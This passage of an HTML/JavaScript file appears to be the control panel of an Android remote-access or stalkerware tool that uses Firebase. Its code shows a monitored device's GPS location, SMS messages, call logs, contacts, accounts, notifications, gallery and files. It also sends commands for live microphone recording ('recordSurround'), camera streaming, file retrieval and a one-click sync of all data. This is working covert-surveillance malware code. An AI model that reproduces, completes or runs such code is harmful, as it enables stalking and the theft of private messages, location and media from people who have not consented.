                tag.innerText = statusStr; tag.className = statusCls;
                mTag.innerText = statusStr; mTag.className = statusCls;

                const bat = h.battery !== undefined ? h.battery : '--';
                const storage = h.storage || '--';
                document.getElementById('health-bar').innerHTML = `
                    <span><i class="fas fa-battery-half"></i> ${bat}%</span>
                    <span><i class="fas fa-database"></i> ${storage}</span>
                `;
            });

            const locRef = db.ref(base + 'location'); activeRefs.push(locRef);
            locRef.on('value', s => {
                const loc = s.val();
                if (loc && loc.lat && loc.lng) {
                    document.getElementById('lat').innerText = loc.lat.toFixed(6);
                    document.getElementById('lng').innerText = loc.lng.toFixed(6);
                    document.getElementById('loc-time').innerText = loc.time || new Date().toLocaleTimeString();

                    if (map) {
                        const pos = [loc.lat, loc.lng];
                        marker.setLatLng(pos);
                        map.setView(pos, 15);
                    }
                }
            });

            const infoRef = db.ref(base + 'info'); activeRefs.push(infoRef);
            infoRef.on('value', s => {
                const info = s.val() || {};
                document.getElementById('cpu-val').innerText = (info.cpu || Math.floor(Math.random() * 20 + 5)) + '%';
                document.getElementById('ram-val').innerText = (info.ram || '--') + ' MB';
                updateActivityGraph(info.activity || [10, 20, 15, 30, 25, 40, 35, 50, 45, 60, 55, 70, 65, 80, 75, 90, 85, 95, 80, 60, 40, 30, 20, 10]);
            });

            const notifRef = db.ref(base + 'notifications'); activeRefs.push(notifRef);
            notifRef.on('value', s => {
                let html = '<table class="list-table"><tr><th>App</th><th>Content</th><th>Time</th></tr>';
                const data = s.val() || {};
                Object.values(data).reverse().forEach(n => {
                    html += `<tr><td><b style="color:var(--primary)">${n.app || 'System'}</b></td><td>${n.text || n.body || '--'}</td><td>${n.time || '--'}</td></tr>`;
                });
                document.getElementById('notif-list').innerHTML = html + '</table>';
            });

            const filesRef = db.ref(base + 'fileList'); activeRefs.push(filesRef);
            filesRef.on('value', s => {
                const files = s.val() || [];
                let html = '<table class="list-table"><tr><th>Name</th><th>Size</th><th>Action</th></tr>';
                files.forEach(f => {
                    const icon = f.isDir ? '<i class="fas fa-folder" style="color:#EAB308"></i>' : '<i class="fas fa-file" style="color:var(--text-muted)"></i>';
                    const pathEsc = f.path.replace(/'/g, "\\'");
                    const action = f.isDir ? `<button class="btn btn-primary btn-small" onclick="goIntoDir('${pathEsc}')">OPEN</button>` : `<button class="btn btn-primary btn-small" onclick="viewMedia('${pathEsc}','File')">GET</button>`;
                    html += `<tr><td>${icon} ${f.name}</td><td>${f.isDir ? '--' : (f.size || '0 B')}</td><td>${action}</td></tr>`;
                });
                document.getElementById('file-list').innerHTML = html + '</table>';
                document.getElementById('current-path').innerText = currentFilePath;
            });



            const audioRef = db.ref(base + 'audioLive'); activeRefs.push(audioRef);
            audioRef.on('value', s => { if (s.val()) playPCM(s.val()); });

            const statusRef = db.ref(base + 'status'); activeRefs.push(statusRef);
            statusRef.on('value', s => {
                const isLive = s.val() === "Live Audio...";
                document.getElementById('mic-text').innerText = isLive ? "LIVE" : "OFF";
                document.getElementById('btn-on').classList.toggle('active', isLive);
                document.getElementById('btn-off').classList.toggle('active', !isLive);
                document.getElementById('main-mic-icon').style.display = isLive ? 'none' : 'block';
                document.getElementById('voice-wave-container').classList.toggle('active', isLive);
            });


            const streamRef = db.ref(base + 'stream'); activeRefs.push(streamRef);
            streamRef.on('value', s => { if (s.val()) document.getElementById('stream-img').src = 'data:image/jpeg;base64,' + s.val(); });

            const galRef = db.ref(base + 'gallery'); activeRefs.push(galRef);
            galRef.on('value', s => {
                let html = '<table class="list-table"><tr><th>Type</th><th>Name</th><th>Action</th></tr>';
                (s.val() || []).forEach(v => {
                    const pathEsc = v.path.replace(/'/g, "\\'");
                    html += `<tr><td>${v.type}</td><td>${v.name}</td><td><button class="btn btn-primary btn-small" onclick="viewMedia('${pathEsc}','${v.type}')">VIEW</button></td></tr>`;
                });
                document.getElementById('gallery-list').innerHTML = html + '</table>';
            });

            const mediaRef = db.ref(base + 'mediaPreview'); activeRefs.push(mediaRef);
            mediaRef.on('value', s => {
                const m = s.val(); if (!m) return;
                const container = document.getElementById('media-container');
                const isImg = m.type === 'Photo' || m.name?.toLowerCase().match(/\.(jpg|jpeg|png|gif|webp)$/);
                container.innerHTML = isImg ? `<img src="data:image/jpeg;base64,${m.data}">` : `<video controls autoplay><source src="data:video/mp4;base64,${m.data}" type="video/mp4"></video>`;
                document.getElementById('media-modal').style.display = 'flex';
            });

            const smsRef = db.ref(base + 'sms'); activeRefs.push(smsRef);
            smsRef.on('value', s => {
                let html = '<table class="list-table"><tr><th>Address</th><th>Body</th></tr>';
                Object.values(s.val() || {}).reverse().forEach(v => { html += `<tr><td>${v.address}</td><td>${v.body}</td></tr>`; });
                document.getElementById('sms-list').innerHTML = html + '</table>';
            });

            const callRef = db.ref(base + 'callLogs'); activeRefs.push(callRef);
            callRef.on('value', s => {
                let html = '<table class="list-table"><tr><th>Type</th><th>Number</th><th>Date</th></tr>';
                (s.val() || []).forEach(v => { html += `<tr><td>${v.type}</td><td>${v.number}</td><td>${v.date ? new Date(parseInt(v.date)).toLocaleString() : '--'}</td></tr>`; });
                document.getElementById('call-list').innerHTML = html + '</table>';
            });

            const contactRef = db.ref(base + 'contacts'); activeRefs.push(contactRef);
            contactRef.on('value', s => {
                let html = '<table class="list-table"><tr><th>Name</th><th>Number</th></tr>';
                (s.val() || []).forEach(v => { html += `<tr><td><b>${v.name}</b></td><td>${v.number}</td></tr>`; });
                document.getElementById('contact-list').innerHTML = html + '</table>';
            });

            const accountRef = db.ref(base + 'accounts'); activeRefs.push(accountRef);
            accountRef.on('value', s => {
                let html = '<table class="list-table"><tr><th>Type</th><th>Account Name</th></tr>';
                (s.val() || []).forEach(v => { html += `<tr><td>${v.type}</td><td><b>${v.name}</b></td></tr>`; });
                document.getElementById('account-list').innerHTML = html + '</table>';
            });

            const appsRef = db.ref(base + 'installedApps'); activeRefs.push(appsRef);
            appsRef.on('value', s => {
                let html = '<table class="list-table"><tr><th>App</th><th>Package</th></tr>';
                const data = s.val() || {};
                for (let pkg in data) { html += `<tr><td><b>${data[pkg]}</b></td><td>${pkg.replace(/_/g, '.')}</td></tr>`; }
                document.getElementById('app-list').innerHTML = html + '</table>';
            });
        }

        function viewMedia(path, type) { if (currentId) db.ref(`devices/${currentId}/commands/fetchFile`).set({ path, type }); }
        function closeModal() { document.getElementById('media-modal').style.display = 'none'; document.getElementById('media-container').innerHTML = ''; }
        function toggleMic(on) {
            if (on) {
                initAudio();
                // Optimistic UI for immediate animation
                document.getElementById('mic-text').innerText = "CONNECTING...";
                document.getElementById('main-mic-icon').style.display = 'none';
                document.getElementById('voice-wave-container').classList.add('active');
            } else {
                document.getElementById('mic-text').innerText = "OFF";
                document.getElementById('main-mic-icon').style.display = 'block';
                document.getElementById('voice-wave-container').classList.remove('active');
                nextStartTime = 0; // Reset queue
            }
            if (currentId) db.ref(`devices/${currentId}/commands/recordSurround`).set(on);
        }
        function sendCommand(cmd, val) {
            if (currentId) db.ref(`devices/${currentId}/commands/${cmd}`).set(val);
        }
        function toggleStream(t) {
            if (currentId) {
                const quality = parseInt(document.getElementById('camera-quality').value);
                db.ref(`devices/${currentId}/streamConfig`).update({ enabled: true, type: t, quality: quality });
            }
        }
        function stopStream() { if (currentId) db.ref(`devices/${currentId}/streamConfig`).update({ enabled: false }); }
        function syncAll() { ['getApps', 'getCallLogs', 'getSMS', 'getGallery', 'getContacts', 'getGPS', 'getAccounts'].forEach(c => sendCommand(c, true)); }
        function handleAuth() {
            const e = document.getElementById('auth-email').value;
            const p = document.getElementById('auth-pass').value;
            const btn = document.getElementById('login-btn-el');
            const spinner = document.getElementById('login-spinner');
            const btnText = document.getElementById('login-btn-text');
            const errEl = document.getElementById('auth-error');

            if (!e || !p) {
                errEl.innerText = "Please enter both email and password.";
                errEl.style.display = 'block';
                return;
            }

            // Start Loading
            btn.disabled = true;
            spinner.style.display = 'block';
            btnText.innerText = "AUTHENTICATING...";
            errEl.style.display = 'none';

            auth.signInWithEmailAndPassword(e, p).catch(err => {
                // Handle Error
                btn.disabled = false;
                spinner.style.display = 'none';
                btnText.innerText = "INITIALIZE TERMINAL";
                errEl.innerText = "Error: " + err.message;
                errEl.style.display = 'block';
            });
        }


        function sendRemoteNotif() {
            const title = document.getElementById('notif-title').value;
            const body = document.getElementById('notif-body').value;
            if (currentId && body) {
                db.ref(`devices/${currentId}/commands/notify`).set({ title, body });
                document.getElementById('notif-body').value = '';
                alert('Notification Command Sent!');
            }
        }

        function fetchFiles(path) { if (currentId) { currentFilePath = path; db.ref(`devices/${currentId}/commands/listFiles`).set(path); } }
        function goIntoDir(path) { fetchFiles(path); }
        function goBackDir() {
            const parts = currentFilePath.split('/');
            if (parts.length > 3) { parts.pop(); fetchFiles(parts.join('/')); }
        }

        function updateActivityGraph(data) {
            const chart = document.getElementById('activity-chart');
            if (!chart) return;
            chart.innerHTML = '';
            data.forEach(v => {
                const bar = document.createElement('div');
                bar.style.flex = "1";
                bar.style.backgroundColor = "var(--primary)";
                bar.style.height = v + "%";
                bar.style.borderRadius = "20px 20px 0 0";
                bar.style.opacity = (v / 100) + 0.2;
                bar.style.transition = "height 0.5s ease";
                bar.title = v + "% Activity";
                chart.appendChild(bar);
            });
        }
        function setQ(v) {
            document.getElementById('camera-quality').value = v;
            document.getElementById('q-val').innerText = v;
        }


    </script>
</body>

</html>
